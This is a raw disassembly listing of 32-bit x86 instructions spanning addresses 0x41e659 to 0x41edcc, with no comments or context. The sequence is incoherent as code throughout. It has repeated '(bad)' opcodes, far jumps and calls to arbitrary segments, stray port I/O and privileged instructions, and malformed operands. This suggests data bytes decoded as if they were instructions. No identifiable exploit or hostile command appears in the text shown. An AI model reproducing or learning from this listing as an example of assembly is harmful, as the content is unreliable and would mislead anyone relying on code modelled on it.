  41e659:	add    eax,DWORD PTR [ebp+edi*4-0x612fcb6]
  41e660:	pusha  
  41e661:	or     ecx,DWORD PTR [ecx+0x4b01bfe5]
  41e667:	je     0x41e625
  41e669:	nop
  41e66a:	mov    esi,0x25ea4fae
  41e66f:	in     al,0xe
  41e671:	adc    DWORD PTR [esi+0x7e994f99],edi
  41e677:	or     DWORD PTR [ebx+0x32],esi
  41e67a:	pop    esp
  41e67b:	or     esp,edi
  41e67d:	jbe    0x41e65c
  41e67f:	mov    BYTE PTR [ebx-0x5a],ah
  41e682:	arpl   WORD PTR [ebx+edx*1-0x16],dx
  41e686:	mov    bh,0x4e
  41e688:	sbb    dl,BYTE PTR [ebx+0x5b]
  41e68b:	and    al,0x8
  41e68d:	xor    eax,0x15ba02d5
  41e692:	add    cl,bh
  41e694:	mov    bl,0xd6
  41e696:	pop    es
  41e697:	cs lahf 
  41e699:	dec    ebp
  41e69a:	imul   edi,DWORD PTR [ebx+0x12],0xffffffe1
  41e69e:	scas   al,BYTE PTR es:[edi]
  41e69f:	jae    0x41e71e
  41e6a1:	and    eax,0x9328fce4
  41e6a6:	inc    edi
  41e6a7:	cmp    edx,DWORD PTR [edi]
  41e6a9:	jmp    0x539:0xff9d96a
  41e6b0:	push   ds
  41e6b1:	aaa    
  41e6b2:	ret    0x2cf9
  41e6b5:	ret    
  41e6b6:	adc    DWORD PTR [eax+0x57],eax
  41e6b9:	sub    BYTE PTR [ecx],dl
  41e6bb:	adc    ecx,edi
  41e6bd:	jp     0x41e67f
  41e6bf:	push   ebx
  41e6c0:	add    DWORD PTR [ecx+eiz*1+0x54],ecx
  41e6c4:	jge    0x41e6fa
  41e6c6:	call   0xb0e7:0x3ef476fe
  41e6cd:	ror    DWORD PTR es:[ebp+0x5e],0x97
  41e6d2:	clc    
  41e6d3:	add    DWORD PTR [esi-0x23bd4a26],edx
  41e6d9:	jle    0x41e65d
  41e6db:	mov    esi,0x4e51a05e
  41e6e0:	mov    ah,0xbc
  41e6e2:	inc    ebp
  41e6e3:	enter  0x696f,0x11
  41e6e7:	push   ds
  41e6e8:	xchg   esp,eax
  41e6e9:	add    bl,BYTE PTR [ecx]
  41e6eb:	ins    BYTE PTR es:[edi],dx
  41e6ec:	jmp    0x3274fb44
  41e6f1:	dec    edi
  41e6f2:	jg     0x41e720
  41e6f4:	adc    cl,BYTE PTR [ebx]
  41e6f6:	ja     0x41e6c0
  41e6f8:	fwait
  41e6f9:	xchg   ebx,eax
  41e6fa:	sbb    BYTE PTR [ebp+0x4e14c1c3],0xf
  41e701:	mov    ch,0xfc
  41e703:	inc    ebx
  41e704:	dec    edi
  41e705:	mov    dl,0x7e
  41e707:	mov    ds:0x2271fabb,eax
  41e70c:	mov    edx,0xe26255cf
  41e711:	push   edx
  41e712:	fcomp  DWORD PTR [ecx+0x52]
  41e715:	mov    bh,0x73
  41e717:	dec    eax
  41e718:	dec    eax
  41e719:	sub    edx,ecx
  41e71b:	jmp    0x41e6c8
  41e71d:	adc    eax,0xde13fd
  41e722:	popf   
  41e723:	mov    esi,0x88c6b918
  41e728:	test   BYTE PTR [esi+ecx*4-0x4e46af75],dh
  41e72f:	rcl    edi,1
  41e731:	xlat   BYTE PTR ds:[ebx]
  41e732:	xor    DWORD PTR ss:[ebx],edi
  41e735:	repnz popa 
  41e737:	int    0x45
  41e739:	push   ss
  41e73a:	push   esi
  41e73b:	(bad)  
  41e73c:	cmc    
  41e73d:	mov    ebx,0xc5495be
  41e742:	outs   dx,DWORD PTR ds:[esi]
  41e743:	pop    eax
  41e744:	jle    0x41e714
  41e746:	cmp    al,0x44
  41e748:	mov    ecx,0xb61fbc7b
  41e74d:	pop    ebp
  41e74e:	cmp    esi,edi
  41e750:	cli    
  41e751:	btr    eax,ebx
  41e754:	jp     0x41e705
  41e756:	inc    edx
  41e757:	sub    eax,0xb419ed8f
  41e75c:	inc    ebx
  41e75d:	push   es
  41e75e:	adc    DWORD PTR [ecx+0x6ff32b9d],0xe0777514
  41e768:	sbb    esp,eax
  41e76a:	into   
  41e76b:	adc    cl,cl
  41e76d:	into   
  41e76e:	int3   
  41e76f:	mov    ecx,0xff16386b
  41e774:	arpl   di,ax
  41e776:	xchg   BYTE PTR [edi],cl
  41e778:	xchg   ebp,eax
  41e779:	loopne 0x41e7d9
  41e77b:	inc    edx
  41e77c:	adc    eax,0x4ea34ad8
  41e781:	retf   0x270d
  41e784:	dec    eax
  41e785:	jmp    0x30959a02
  41e78a:	or     DWORD PTR [edi-0x2240b0a2],ecx
  41e790:	dec    eax
  41e791:	ss ins DWORD PTR es:[edi],dx
  41e793:	clc    
  41e794:	mov    al,BYTE PTR [ecx+0x2bae2ca1]
  41e79a:	mov    bh,0xad
  41e79c:	mov    ch,0xdc
  41e79e:	sub    eax,0x2f05f0cf
  41e7a3:	imul   ebp,DWORD PTR [edx+0x6f],0xffffffcb
  41e7a7:	popf   
  41e7a8:	mov    ecx,ecx
  41e7aa:	cld    
  41e7ab:	jb     0x41e79e
  41e7ad:	daa    
  41e7ae:	cmp    al,0x95
  41e7b0:	ret    0x5957
  41e7b3:	dec    BYTE PTR [ebp+esi*2+0x1b]
  41e7b7:	mov    cl,0x70
  41e7b9:	out    0x8b,al
  41e7bb:	and    al,0x82
  41e7bd:	push   ss
  41e7be:	(bad)  
  41e7bf:	sbb    eax,0xcde1ed0c
  41e7c4:	sbb    eax,0x5f1fd01
  41e7c9:	int    0x15
  41e7cb:	in     eax,0x41
  41e7cd:	xchg   ebx,eax
  41e7ce:	push   edx
  41e7cf:	add    al,0x1a
  41e7d1:	div    BYTE PTR [edi-0x62]
  41e7d4:	out    0x27,al
  41e7d6:	inc    ebp
  41e7d7:	lods   eax,DWORD PTR ds:[esi]
  41e7d8:	jmp    0x4cb0e6d3
  41e7dd:	fcomp  st(5)
  41e7df:	mov    cs,WORD PTR [ebp-0x19]
  41e7e2:	push   esi
  41e7e3:	fmul   st,st(5)
  41e7e5:	xor    bl,BYTE PTR [eax]
  41e7e7:	aad    0x8a
  41e7e9:	sbb    eax,0x3018852b
  41e7ee:	mov    DWORD PTR [ecx+0x3f],esi
  41e7f1:	dec    esi
  41e7f2:	out    dx,al
  41e7f3:	std    
  41e7f4:	loop   0x41e7a5
  41e7f6:	jbe    0x41e7b4
  41e7f8:	stc    
  41e7f9:	jl     0x41e7c5
  41e7fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7fc:	jmp    0x41e795
  41e7fe:	mov    ebp,0xe0d7898d
  41e803:	(bad)  
  41e804:	xor    edx,0xce17d961
  41e80a:	jae    0x41e7ef
  41e80c:	icebp  
  41e80d:	fcmovne st,st(4)
  41e80f:	lahf   
  41e810:	xchg   ebp,eax
  41e811:	sbb    eax,0xd5148e20
  41e816:	pop    ebx
  41e817:	sbb    eax,0xabbe5f11
  41e81c:	pop    esi
  41e81d:	inc    eax
  41e81e:	in     al,dx
  41e81f:	mov    ch,BYTE PTR [ecx+0x67]
  41e822:	scas   eax,DWORD PTR es:[edi]
  41e823:	mov    ebp,0x7719e308
  41e828:	inc    ebp
  41e829:	inc    esp
  41e82a:	mov    ecx,0x1a7db777
  41e82f:	mov    eax,0x8454c45f
  41e834:	mul    BYTE PTR [eax]
  41e836:	cdq    
  41e837:	pop    ss
  41e838:	call   0x5a7f:0xdb97450a
  41e83f:	mov    ch,BYTE PTR [ebx-0x16]
  41e842:	jmp    0x6438:0xbe85c1fa
  41e849:	mov    ebx,0x8d329190
  41e84e:	mov    edi,0x410e99ce
  41e853:	cmp    esi,DWORD PTR [esi-0x2a3d9f0e]
  41e859:	lock mov edx,DWORD PTR [edi+0x18]
  41e85d:	call   DWORD PTR [ebp+0x44dfc902]
  41e863:	fadd   st(2),st
  41e865:	cmp    BYTE PTR [ebp*4+0x40bb59a0],0x9b
  41e86d:	sbb    bl,BYTE PTR [ecx-0x219f29f5]
  41e873:	sbb    eax,0x9b1ec0d1
  41e878:	cs in  eax,dx
  41e87a:	jmp    0x275c:0xa83480dc
  41e881:	leave  
  41e882:	jmp    0x34ea041d
  41e887:	das    
  41e888:	test   ebp,ebx
  41e88a:	jge    0x41e8b3
  41e88c:	add    bl,0x28
  41e88f:	push   ebx
  41e890:	and    dl,cl
  41e892:	scas   eax,DWORD PTR es:[edi]
  41e893:	int3   
  41e894:	outs   dx,DWORD PTR ds:[esi]
  41e895:	cmp    eax,0x95ab97c6
  41e89a:	jbe    0x41e895
  41e89c:	mov    ah,0x8f
  41e89e:	jl     0x41e855
  41e8a0:	lods   al,BYTE PTR ds:[esi]
  41e8a1:	mov    gs,esi
  41e8a3:	xor    bh,bh
  41e8a5:	fdivr  QWORD PTR [ecx-0x5e]
  41e8a8:	loopne 0x41e90c
  41e8aa:	jecxz  0x41e8be
  41e8ac:	lahf   
  41e8ad:	les    eax,FWORD PTR ds:0x5ca57eca
  41e8b3:	out    0xfb,al
  41e8b5:	xor    al,0x3c
  41e8b7:	mov    al,0xf9
  41e8b9:	jnp    0x41e858
  41e8bb:	jmp    0x41e8b6
  41e8bd:	pop    ds
  41e8be:	pop    esp
  41e8bf:	and    ebp,edx
  41e8c1:	mov    ?,WORD PTR [edi-0x6f]
  41e8c4:	jp     0x41e912
  41e8c6:	sub    DWORD PTR [edx-0x10],edi
  41e8c9:	sbb    edx,edx
  41e8cb:	shr    BYTE PTR [ebx+0x7b410e9c],0x5d
  41e8d2:	jge    0x41e884
  41e8d4:	ror    BYTE PTR [ecx-0x52],1
  41e8d7:	loopne 0x41e8fe
  41e8d9:	cld    
  41e8da:	mov    eax,0xa9287705
  41e8df:	jge    0x41e8c7
  41e8e1:	ins    DWORD PTR es:[edi],dx
  41e8e2:	rcl    BYTE PTR [ecx+eax*2+0x18],1
  41e8e6:	push   0xffffffe9
  41e8e8:	data16 jp 0x41e873
  41e8eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8ec:	arpl   WORD PTR [esi-0x1a],bx
  41e8ef:	pop    ds
  41e8f0:	pop    ebp
  41e8f1:	lods   al,BYTE PTR ds:[esi]
  41e8f2:	out    0x57,al
  41e8f4:	mov    ebx,0xf42b98a4
  41e8f9:	sbb    edx,DWORD PTR [ebx-0x1dc674e6]
  41e8ff:	cld    
  41e900:	push   ecx
  41e901:	aam    0x5
  41e903:	je     0x41e8fb
  41e905:	jecxz  0x41e891
  41e907:	mov    ch,0x31
  41e909:	mov    ecx,0x6b9caeb2
  41e90e:	ss rcr ebx,cl
  41e911:	mov    dl,0xa5
  41e913:	and    cl,BYTE PTR [edx-0x59d3ed0b]
  41e919:	xchg   DWORD PTR [esi-0x3c9067a0],ebx
  41e91f:	lock xchg DWORD PTR [esi+0x2a82b2b4],esp
  41e926:	loope  0x41e8df
  41e928:	jo     0x41e8c0
  41e92a:	push   0x4a
  41e92c:	aas    
  41e92d:	xchg   ebp,eax
  41e92e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e92f:	mov    al,ds:0xabf2bc8c
  41e934:	les    ebx,FWORD PTR gs:[ebx-0x7cd777a5]
  41e93b:	mov    bl,0x6b
  41e93d:	cmp    al,0xa5
  41e93f:	outs   dx,BYTE PTR ds:[esi]
  41e940:	xor    eax,0xcdcad26c
  41e945:	sbb    ebx,DWORD PTR [edx-0x1fc7f7b7]
  41e94b:	push   ds
  41e94c:	pop    edi
  41e94d:	mov    ebx,0x632d293a
  41e952:	ret    0xa81a
  41e955:	xor    DWORD PTR [edx-0x5b],0xf47f4121
  41e95c:	dec    ebp
  41e95d:	jge    0x41e912
  41e95f:	push   0x7f
  41e961:	pop    ecx
  41e962:	stc    
  41e963:	and    ecx,eax
  41e965:	cmp    al,0xe0
  41e967:	dec    esi
  41e968:	or     DWORD PTR [edi-0x40c11ad8],eax
  41e96e:	popa   
  41e96f:	les    edx,FWORD PTR [edi+esi*8]
  41e972:	push   0x6a1327d3
  41e977:	outs   dx,BYTE PTR ds:[esi]
  41e978:	(bad)  
  41e979:	mov    bh,0x93
  41e97b:	mov    dh,BYTE PTR [edi]
  41e97d:	xor    DWORD PTR [ebx+0x480bdc08],ebp
  41e983:	dec    ecx
  41e984:	data16 jp 0x41e9ff
  41e987:	push   ebx
  41e988:	xchg   ebp,eax
  41e989:	dec    eax
  41e98a:	inc    ecx
  41e98b:	pushf  
  41e98c:	sbb    ebx,DWORD PTR [edx-0x35484e00]
  41e992:	push   ebp
  41e993:	add    DWORD PTR fs:[esi],eax
  41e996:	sub    cl,BYTE PTR [eax]
  41e998:	test   al,0xe2
  41e99a:	je     0x41e9ec
  41e99c:	push   ds
  41e99d:	inc    esi
  41e99e:	ffree  st(0)
  41e9a0:	mov    esi,0xbc74b271
  41e9a5:	test   al,0x46
  41e9a7:	xlat   BYTE PTR ds:[ebx]
  41e9a8:	or     bl,ah
  41e9aa:	mov    ecx,DWORD PTR [edx+edi*4+0x67]
  41e9ae:	ret    0x2973
  41e9b1:	or     DWORD PTR [eax-0x75],eax
  41e9b4:	inc    edx
  41e9b5:	inc    edi
  41e9b6:	mov    ebx,0x1c69339d
  41e9bb:	ss inc edx
  41e9bd:	mov    ecx,0x9e33dfdf
  41e9c2:	dec    ebp
  41e9c3:	sub    BYTE PTR [esi],cl
  41e9c5:	fild   WORD PTR gs:[esi+0x39b0d1ae]
  41e9cc:	or     esp,eax
  41e9ce:	ret    0xa39f
  41e9d1:	mov    eax,ds:0x5f27b11b
  41e9d6:	outs   dx,DWORD PTR ds:[esi]
  41e9d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9d8:	cmp    DWORD PTR [ecx-0x54],edx
  41e9db:	pop    ebx
  41e9dc:	int    0xf4
  41e9de:	xor    ecx,DWORD PTR [edx-0xf]
  41e9e1:	clc    
  41e9e2:	mov    edx,0x16e0516
  41e9e7:	and    ebx,DWORD PTR [ebp+0x76]
  41e9ea:	nop
  41e9eb:	les    esi,FWORD PTR [ebx+0x27a894ed]
  41e9f1:	pusha  
  41e9f2:	sbb    eax,0xf4560f3d
  41e9f7:	inc    ebp
  41e9f8:	jmp    0x41e99c
  41e9fa:	fld    TBYTE PTR [ebx]
  41e9fc:	js     0x41ea65
  41e9fe:	loopne 0x41e9be
  41ea00:	aaa    
  41ea01:	dec    eax
  41ea02:	ss cdq 
  41ea04:	hlt    
  41ea05:	mov    DWORD PTR [ebx],esi
  41ea07:	fmul   DWORD PTR [edi-0x1db07e58]
  41ea0d:	loop   0x41ea20
  41ea0f:	mov    ds:0xda19fe3b,al
  41ea14:	scas   eax,DWORD PTR es:[edi]
  41ea15:	sbb    esi,esp
  41ea17:	scas   al,BYTE PTR es:[edi]
  41ea18:	xor    al,0x35
  41ea1a:	es pop es
  41ea1c:	out    dx,al
  41ea1d:	jmp    0x96f1c2a5
  41ea22:	clc    
  41ea23:	adc    DWORD PTR fs:[edx+0x31],ecx
  41ea27:	in     eax,dx
  41ea28:	xchg   BYTE PTR [ecx],ah
  41ea2a:	test   DWORD PTR [ecx-0x109dbe5c],0x2650bf9e
  41ea34:	cli    
  41ea35:	mov    ch,0xdc
  41ea37:	cmp    ebx,esi
  41ea39:	push   edx
  41ea3a:	pusha  
  41ea3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea3c:	xor    dl,dh
  41ea3e:	sbb    DWORD PTR [edx-0x2a],edx
  41ea41:	ss jmp 0xbc4f:0x56af3bc4
  41ea49:	aas    
  41ea4a:	adc    DWORD PTR cs:[ebx-0x1b],ecx
  41ea4e:	pop    ecx
  41ea4f:	std    
  41ea50:	sti    
  41ea51:	mov    edi,0x360bef34
  41ea56:	in     eax,dx
  41ea57:	ins    BYTE PTR es:[edi],dx
  41ea58:	mov    al,0xda
  41ea5a:	outs   dx,DWORD PTR ds:[esi]
  41ea5b:	fadd   QWORD PTR [ebp*2+0x6f5af988]
  41ea62:	inc    ebp
  41ea63:	jnp    0x41ea7c
  41ea65:	daa    
  41ea66:	mov    ch,0x26
  41ea68:	xor    eax,0xed6ce3b2
  41ea6d:	sbb    esi,ecx
  41ea6f:	and    al,0x85
  41ea71:	xor    esi,DWORD PTR [ebp-0x7]
  41ea74:	pop    ebx
  41ea75:	sahf   
  41ea76:	inc    esi
  41ea77:	push   0x5346b797
  41ea7c:	xlat   BYTE PTR ds:[ebx]
  41ea7d:	inc    eax
  41ea7e:	adc    bh,BYTE PTR [esi+0x63]
  41ea81:	mov    dh,0x87
  41ea83:	jo     0x41eaf0
  41ea85:	fs int 0xd5
  41ea88:	ret    0x13f9
  41ea8b:	lock pop ds
  41ea8d:	mov    al,0xc0
  41ea8f:	sub    eax,0x13b34a0
  41ea94:	adc    ebp,ebp
  41ea96:	nop
  41ea97:	or     bh,BYTE PTR [edi-0x3f36e8a4]
  41ea9d:	push   0xa4f26ac8
  41eaa2:	jmp    0x14baf4ac
  41eaa7:	add    ebx,DWORD PTR [edi]
  41eaa9:	xchg   ebx,eax
  41eaaa:	mov    edi,0x256d220f
  41eaaf:	adc    al,0x54
  41eab1:	and    al,BYTE PTR [edi]
  41eab3:	cld    
  41eab4:	and    bl,dh
  41eab6:	push   es
  41eab7:	sbb    al,0x7f
  41eab9:	retf   
  41eaba:	psubsw mm0,mm5
  41eabd:	mov    esi,DWORD PTR [eax-0x2951ba8c]
  41eac3:	jmp    0xb335350d
  41eac8:	mov    esi,0xc2d6fb4
  41eacd:	add    ch,BYTE PTR [eax+0x787baaa8]
  41ead3:	ins    BYTE PTR es:[edi],dx
  41ead4:	test   BYTE PTR [ebp+0x2af8131b],cl
  41eada:	loope  0x41eb47
  41eadc:	pop    eax
  41eadd:	popa   
  41eade:	xlat   BYTE PTR ds:[ebx]
  41eadf:	(bad)  
  41eae0:	mov    ?,WORD PTR [ebx]
  41eae2:	fucomip st,st(4)
  41eae4:	xchg   BYTE PTR [edx-0x5],ah
  41eae7:	pop    ds
  41eae8:	xchg   esi,eax
  41eae9:	mov    ds:0xb6877220,eax
  41eaee:	sbb    BYTE PTR [edi+0x6053aee7],al
  41eaf4:	sub    bl,BYTE PTR [ebx]
  41eaf6:	les    esi,FWORD PTR [esi+0x4e]
  41eaf9:	dec    ebp
  41eafa:	pop    ss
  41eafb:	and    BYTE PTR [esi-0x5c],0xe5
  41eaff:	ret    
  41eb00:	mov    ch,bl
  41eb02:	push   esp
  41eb03:	inc    ebx
  41eb04:	and    BYTE PTR [edi-0x29],bh
  41eb07:	repz out 0xd,al
  41eb0a:	pop    ds
  41eb0b:	mov    eax,ds:0x2633e9b4
  41eb10:	retf   
  41eb11:	test   ah,0x49
  41eb14:	and    BYTE PTR [esi*8+0x50ea5218],al
  41eb1b:	(bad)  
  41eb1c:	mov    ch,0x2a
  41eb1e:	add    cl,cl
  41eb20:	ins    DWORD PTR es:[edi],dx
  41eb21:	sbb    al,0x9a
  41eb23:	push   edi
  41eb24:	and    cl,BYTE PTR [edi]
  41eb26:	jb     0x41eb43
  41eb28:	jne    0x41eaca
  41eb2a:	mov    WORD PTR [ecx-0x78528c77],?
  41eb30:	push   ebx
  41eb31:	aas    
  41eb32:	xor    ebp,DWORD PTR [edx-0x314d8719]
  41eb38:	rol    dh,1
  41eb3a:	push   0xee8256e5
  41eb3f:	imul   esp,edi,0xab4a9f40
  41eb45:	(bad)  
  41eb46:	and    DWORD PTR [ecx-0x7],edi
  41eb49:	mov    ds:0x7c3aea73,eax
  41eb4e:	xchg   ebx,eax
  41eb4f:	push   edx
  41eb50:	movaps xmm0,xmm1
  41eb53:	xchg   esp,edi
  41eb55:	mov    eax,DWORD PTR [ecx]
  41eb57:	clc    
  41eb58:	cmpxchg edi,esi
  41eb5b:	aaa    
  41eb5c:	sbb    BYTE PTR [ebx],0x39
  41eb5f:	pop    eax
  41eb60:	jp     0x41eb22
  41eb62:	adc    DWORD PTR [ebx],ebx
  41eb64:	dec    ebp
  41eb65:	mov    al,ds:0xb014769f
  41eb6a:	xchg   ebx,eax
  41eb6b:	dec    ecx
  41eb6c:	sbb    eax,0x520ac868
  41eb71:	ins    DWORD PTR es:[edi],dx
  41eb72:	ins    DWORD PTR es:[edi],dx
  41eb73:	je     0x41ebed
  41eb75:	in     al,0x96
  41eb77:	in     eax,0x56
  41eb79:	aam    0xfa
  41eb7b:	jecxz  0x41ebcc
  41eb7d:	ror    BYTE PTR [ebp-0x4319a020],0xaa
  41eb84:	adc    bl,BYTE PTR [ebx+0x71]
  41eb87:	xor    DWORD PTR [ebp+0x30e18b5a],0x65
  41eb8e:	xchg   DWORD PTR [eax-0x67],edx
  41eb91:	shr    DWORD PTR [ebx-0x495ec5fe],1
  41eb97:	dec    edx
  41eb98:	test   BYTE PTR [edi],ch
  41eb9a:	xchg   esi,eax
  41eb9b:	lods   eax,DWORD PTR ds:[esi]
  41eb9c:	xor    BYTE PTR [ebx],0x10
  41eb9f:	ins    BYTE PTR es:[edi],dx
  41eba0:	(bad)  
  41eba1:	sbb    al,0x19
  41eba3:	js     0x41eb77
  41eba5:	push   ebp
  41eba6:	mov    ss,eax
  41eba8:	stos   BYTE PTR es:[edi],al
  41eba9:	jmp    0x41eb76
  41ebab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebac:	xor    BYTE PTR [eax],dl
  41ebae:	fist   DWORD PTR [ebp+0x6dbc538d]
  41ebb4:	loope  0x41eb82
  41ebb6:	cmc    
  41ebb7:	stos   DWORD PTR es:[edi],eax
  41ebb8:	lods   al,BYTE PTR ds:[esi]
  41ebb9:	lahf   
  41ebba:	jbe    0x41eb98
  41ebbc:	sahf   
  41ebbd:	imul   ecx,DWORD PTR [ebx],0x62
  41ebc0:	dec    ebp
  41ebc1:	arpl   WORD PTR [esi+0x738c601d],bp
  41ebc7:	adc    BYTE PTR [edx+eax*4+0x31],dh
  41ebcb:	pop    ecx
  41ebcc:	call   0x4f0:0xf9ee2887
  41ebd3:	(bad)  
  41ebd5:	aaa    
  41ebd6:	mov    ch,0xed
  41ebd8:	jmp    0xdc7f:0x9bf9ef56
  41ebdf:	inc    eax
  41ebe0:	ins    DWORD PTR es:[edi],dx
  41ebe1:	stc    
  41ebe2:	sbb    edi,esp
  41ebe4:	es out dx,eax
  41ebe6:	lock loope 0x41eb78
  41ebe9:	xor    ebp,ebx
  41ebeb:	pop    eax
  41ebec:	(bad)
  41ebef:	aam    0xfb
  41ebf1:	stos   BYTE PTR es:[edi],al
  41ebf2:	imul   edi,edi,0x75
  41ebf5:	xor    DWORD PTR [ecx+0x11],esi
  41ebf8:	sbb    DWORD PTR [ebp-0x8],0xe2a455e3
  41ebff:	mov    al,0xf6
  41ec01:	sbb    al,0xbd
  41ec03:	xlat   BYTE PTR ds:[ebx]
  41ec04:	mov    cl,0xc
  41ec06:	fsubr  QWORD PTR [esi]
  41ec08:	out    dx,al
  41ec09:	aas    
  41ec0a:	cwde   
  41ec0b:	in     al,dx
  41ec0c:	cmp    eax,0xe8cb6e8d
  41ec11:	jmp    0xb6119761
  41ec16:	xor    DWORD PTR [edx-0x6d],edi
  41ec19:	adc    DWORD PTR [esi-0x60647448],eax
  41ec1f:	sbb    eax,0x4e46a293
  41ec24:	pop    ss
  41ec25:	jne    0x41ec4c
  41ec27:	jle    0x41ec96
  41ec29:	cli    
  41ec2a:	call   0x7b6d:0xd7905075
  41ec31:	dec    eax
  41ec32:	push   edi
  41ec33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec34:	lods   al,BYTE PTR ds:[esi]
  41ec35:	fist   DWORD PTR [ebp+ebx*8-0x3b6bf8f8]
  41ec3c:	adc    dh,0xf5
  41ec3f:	lahf   
  41ec40:	add    al,ch
  41ec42:	and    BYTE PTR [esi-0x29],cl
  41ec45:	jge    0x41ec4a
  41ec47:	repz repz cmp dh,BYTE PTR [ebx]
  41ec4b:	(bad)  
  41ec4c:	loope  0x41ebdb
  41ec4e:	and    ebx,DWORD PTR [ebx]
  41ec50:	ss in  al,dx
  41ec52:	mov    bh,0x1
  41ec54:	cmp    eax,0x52a19461
  41ec59:	outs   dx,BYTE PTR ds:[esi]
  41ec5a:	jecxz  0x41ebe5
  41ec5c:	jl     0x41ecd8
  41ec5e:	mov    edi,0xd6534193
  41ec63:	mov    edx,0x1d70fdab
  41ec68:	scas   eax,DWORD PTR es:[edi]
  41ec69:	and    al,0xf1
  41ec6b:	sub    al,0x32
  41ec6d:	xchg   ebx,eax
  41ec6e:	push   0x3623db6e
  41ec73:	adc    al,0x11
  41ec75:	cmp    BYTE PTR [esi],al
  41ec77:	xor    bl,BYTE PTR [ebx]
  41ec79:	scas   al,BYTE PTR es:[edi]
  41ec7a:	leave  
  41ec7b:	mov    ecx,0x1eb044f5
  41ec80:	mov    edi,0xb66fdf2a
  41ec85:	inc    esp
  41ec86:	adc    al,ch
  41ec88:	aaa    
  41ec89:	inc    edi
  41ec8a:	pushf  
  41ec8b:	xchg   ecx,eax
  41ec8c:	inc    edx
  41ec8d:	jmp    0xb37e:0x7a35b30d
  41ec94:	pop    edx
  41ec95:	jmp    0x41ec47
  41ec97:	add    al,0xfa
  41ec99:	punpckhbw mm2,QWORD PTR [edx-0x3]
  41ec9d:	sbb    DWORD PTR [esi-0x7e67dd72],ebp
  41eca3:	pushf  
  41eca4:	sbb    al,BYTE PTR [ebx-0x6cf101a0]
  41ecaa:	adc    eax,0xde83ff62
  41ecaf:	inc    eax
  41ecb0:	dec    edi
  41ecb1:	stc    
  41ecb2:	mov    al,BYTE PTR [edx]
  41ecb4:	xchg   ecx,eax
  41ecb5:	pop    ecx
  41ecb6:	das    
  41ecb7:	mov    BYTE PTR [eax],ch
  41ecb9:	je     0x41ed04
  41ecbb:	fdiv   DWORD PTR [ecx]
  41ecbd:	ja     0x41ed16
  41ecbf:	sub    eax,0xad3b0575
  41ecc4:	mov    ebp,0x713e8e38
  41ecc9:	out    0x60,al
  41eccb:	sbb    edi,DWORD PTR [esi+0x1e]
  41ecce:	adc    DWORD PTR [edi+0x191710fe],esp
  41ecd4:	in     eax,0x3f
  41ecd6:	iret   
  41ecd7:	sbb    DWORD PTR [ecx-0x4b],ecx
  41ecda:	loop   0x41ed57
  41ecdc:	nop
  41ecdd:	mov    dl,0xb9
  41ecdf:	arpl   WORD PTR [esi+0x5c41cbe2],cx
  41ece5:	and    al,0xdf
  41ece7:	or     BYTE PTR [esp+ebp*2+0x5581e62d],dl
  41ecee:	cmp    esi,eax
  41ecf0:	xchg   ebx,eax
  41ecf1:	inc    esp
  41ecf2:	mov    ds:0x1f48c6e1,al
  41ecf7:	idiv   BYTE PTR [ebx]
  41ecf9:	mov    bh,0xe
  41ecfb:	mov    bh,0xb8
  41ecfd:	call   0xa141:0xdde0b6e4
  41ed04:	push   ebp
  41ed05:	or     edi,DWORD PTR [esi]
  41ed07:	js     0x41ed68
  41ed09:	sub    BYTE PTR [eax],cl
  41ed0b:	dec    ebx
  41ed0c:	adc    DWORD PTR [ebx+0x6d],ebx
  41ed0f:	bound  esp,QWORD PTR [eax+0x29637915]
  41ed15:	cmp    BYTE PTR [edi+0x43fda5b7],bl
  41ed1b:	push   esp
  41ed1c:	lds    edi,FWORD PTR [eax-0x36]
  41ed1f:	int    0x76
  41ed21:	out    dx,eax
  41ed22:	push   esi
  41ed23:	mov    al,ds:0x7169d07c
  41ed28:	adc    DWORD PTR [edi-0x6691a902],ebx
  41ed2e:	push   eax
  41ed2f:	aas    
  41ed30:	fild   DWORD PTR [esi-0x2c348bf0]
  41ed36:	in     al,0x26
  41ed38:	pop    edx
  41ed39:	sub    BYTE PTR ds:0x806d9be1,bl
  41ed3f:	out    0xea,eax
  41ed41:	loope  0x41eda8
  41ed43:	push   eax
  41ed44:	test   BYTE PTR [edi],bl
  41ed46:	push   edx
  41ed47:	pop    eax
  41ed48:	ins    DWORD PTR es:[edi],dx
  41ed49:	jb     0x41ecef
  41ed4b:	cmp    eax,0x6a7a7eb3
  41ed50:	add    al,0x47
  41ed52:	sub    esi,0x57
  41ed55:	(bad)  
  41ed56:	dec    ecx
  41ed57:	sbb    al,0x14
  41ed59:	jno    0x41ed09
  41ed5b:	jg     0x41ed33
  41ed5d:	adc    eax,DWORD PTR [eax-0x637b5290]
  41ed63:	mov    eax,0x721c7c5f
  41ed68:	pop    esi
  41ed69:	adc    BYTE PTR [ebx+0x13],bl
  41ed6c:	push   ebx
  41ed6d:	jne    0x41ed2b
  41ed6f:	(bad)  
  41ed70:	sbb    edx,ecx
  41ed72:	sbb    ecx,ecx
  41ed74:	sub    ch,BYTE PTR [ecx-0x4655e458]
  41ed7a:	out    dx,eax
  41ed7b:	and    ecx,esp
  41ed7d:	jae    0x41ed55
  41ed7f:	mov    BYTE PTR [edx+0x3b0897f9],ah
  41ed85:	xor    ecx,edi
  41ed87:	imul   esi,DWORD PTR [edi+0x1b],0xf9ea7ced
  41ed8e:	out    dx,eax
  41ed8f:	push   ecx
  41ed90:	fndisi(8087 only) 
  41ed92:	sbb    ecx,edx
  41ed94:	add    eax,0x1475731b
  41ed99:	pop    edi
  41ed9a:	xchg   edx,eax
  41ed9b:	mov    cl,0x88
  41ed9d:	repz call 0x35089250
  41eda3:	adc    bl,dl
  41eda5:	retf   0xb2aa
  41eda8:	fdiv   DWORD PTR [ebp+0x3b]
  41edab:	jl     0x41ed79
  41edad:	sbb    bl,dh
  41edaf:	jp     0x41ee2d
  41edb1:	mov    ch,0xc0
  41edb3:	icebp  
  41edb4:	imul   eax,DWORD PTR [ebx],0xd86e661a
  41edba:	adc    ch,bl
  41edbc:	xor    eax,0x621179a2
  41edc1:	sub    al,0x31
  41edc3:	xor    esp,DWORD PTR fs:[ecx+0x57e426a1]
  41edca:	xchg   bl,dl
  41edcc:	retf   0x3f84
